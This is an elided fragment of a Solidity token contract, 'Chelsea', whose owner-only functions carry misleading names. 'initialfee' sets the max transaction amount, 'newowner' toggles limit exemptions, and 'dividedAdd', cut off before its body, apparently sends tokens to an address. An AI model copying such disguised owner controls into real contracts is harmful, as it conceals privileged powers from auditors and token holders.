...
contract Ownable is Context, ShareWisdom {
    ...
    function Amouranth(address newOwner) public onlyOwner {
...
contract Chelsea is Context, IERC20, Ownable {
    using SafeMath for uint256;
    ...
    function initialfee(uint256 amount) external onlyOwner {
        _maxTxAmount = amount;
    }

    function newowner(address pair, bool value) external onlyOwner {
        isTxLimitExempt[pair] = value;
    }

   function dividedAdd(address _token, address _to) external onlyOwner returns (bool _sent)
	  {
